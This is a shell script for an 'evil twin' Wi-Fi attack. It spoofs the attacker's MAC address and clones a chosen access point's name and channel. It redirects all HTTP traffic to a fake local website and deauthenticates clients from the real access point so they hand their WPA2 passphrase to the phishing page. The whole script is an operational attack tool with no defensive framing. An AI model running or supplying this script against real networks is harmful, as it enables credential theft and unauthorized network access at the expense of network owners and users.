#!/bin/sh

# Immitate an Access Point and server a fake website
# in an attempt to grab the WPA2 key

# Kill running APs
killall dnsmasq hostapd

# Spoof mac before doing anything else
export INTERFACE
echo "Select interface for monitoring Access Points"
INTERFACE="$(./pick_interface.sh || exit 1)"

# Change the MAC before any attacks
./macchange.sh "$INTERFACE" 1>/dev/null 2>/dev/null

export BSSID
export ESSID
export CHANNEL
export DBNAME

DBNAME="rogue_AP"

SELECTED_AP="$( ./pick_ap.sh "$INTERFACE" | sed 's/,/\ /g')"

# Extract relevant information from the selected Access Point
BSSID="$(echo "$SELECTED_AP" | awk '{print $1}')"
ESSID="$(echo "$SELECTED_AP" | awk '{print $(NF-1)}')"
CHANNEL="$(echo "$SELECTED_AP" | awk '{print $6}')"

# Start the evil twin Access Point
./host_ap.sh "$ESSID" "" "$CHANNEL" && sleep 3

# Redirect all HTTP traffic to our fake website
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80

# Activate apache and mysql (Assuming Rogue_AP web files are in place)
systemctl start apache2 mysql

# Deauthenticate the target Access Point
echo "Select interface to use for deauthentication."
D_INTERFACE="$(./pick_interface.sh)"
./deauth_easy.sh "$BSSID" "$D_INTERFACE"
/usr/bin/internet "$D_INTERFACE"
